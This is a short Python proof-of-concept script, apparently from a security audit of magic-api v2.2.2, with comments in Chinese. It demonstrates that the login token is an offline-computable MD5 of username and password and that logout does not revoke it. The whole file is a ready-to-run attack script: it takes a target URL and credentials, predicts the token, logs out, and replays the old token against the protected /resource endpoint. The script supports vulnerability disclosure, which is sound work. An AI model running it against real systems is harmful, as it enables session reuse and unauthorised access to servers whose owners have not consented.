#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
F-06: 静态 MD5 token + logout 无效 (magic-api v2.2.2)

配置 magic-api.security.username/password 后:
1. POST /magic/web/login  -> 响应头 Magic-Token = MD5(username||password)  (可离线预计算)
2. POST /magic/web/logout -> 默认空实现, 服务端不吊销
3. 旧 token 继续访问受保护端点 -> 仍 200

用法:
  python3 poc_f06_static_token.py http://target:9999 admin Admin@123456
"""
import hashlib
import json
import sys
import urllib.request

BASE = sys.argv[1].rstrip('/') if len(sys.argv) > 1 else 'http://localhost:9999'
USER = sys.argv[2] if len(sys.argv) > 2 else 'admin'
PWD = sys.argv[3] if len(sys.argv) > 3 else 'admin123'
WEB = f'{BASE}/magic/web'


def post(url, form, headers=None):
    data = '&'.join(f'{k}={v}' for k, v in form.items()).encode()
    req = urllib.request.Request(url, data=data, headers=headers or {})
    return urllib.request.urlopen(req, timeout=10)


# 1. 离线预计算 token (无需与服务器交互)
predicted = hashlib.md5(f'{USER}||{PWD}'.encode()).hexdigest()
print(f'[+] 离线预计算 token: MD5({USER}||{PWD}) = {predicted}')

# 2. 登录验证预测
resp = post(f'{WEB}/login', {'username': USER, 'password': PWD})
token = resp.headers.get('Magic-Token')
print('[+] 登录返回 Magic-Token:', token)
print('[+] 预测 == 实际:', predicted == token)

# 3. 登出
try:
    post(f'{WEB}/logout', {}, headers={'Magic-Token': token})
    print('[+] logout 完成')
except Exception as e:
    print('[!] logout 异常:', e)

# 4. 旧 token 仍可访问受保护端点 -> token 未失效
req = urllib.request.Request(f'{WEB}/resource', headers={'Magic-Token': token})
try:
    body = json.loads(urllib.request.urlopen(req, timeout=10).read())
    print('[+] 登出后用旧 token 访问 /resource -> code:', body.get('code'),
          '(1=成功, token 未被吊销)')
except Exception as e:
    print('[!] 旧 token 访问失败:', e)
